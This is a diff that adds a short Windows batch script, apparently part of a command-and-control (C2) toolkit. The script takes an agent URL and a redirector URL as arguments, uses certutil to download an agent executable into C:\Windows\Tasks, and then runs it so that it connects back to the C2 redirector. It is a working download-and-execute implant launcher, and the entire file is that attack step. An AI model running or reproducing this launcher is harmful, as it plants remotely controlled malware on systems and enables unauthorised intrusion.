@@ -1,0 +1,19 @@
+@echo off
+
+REM Check if all arguments are provided
+if "%~5"=="" (
+    echo Usage: %0 c2_agent_url_windows agent_name c2_redirector_url listenerport psk
+    exit /b 1
+)
+
+REM Set arguments
+set c2_agent_url_windows=%1
+set agent_name=%2
+set c2_redirector_url=%3
+
+
+echo Downloading agent...
+certutil -urlcache -split -f %c2_agent_url_windows% C:\Windows\Tasks\%agent_name%.exe
+
+echo Running agent...
+C:\Windows\Tasks\%agent_name%.exe -url %c2_redirector_url%/ 
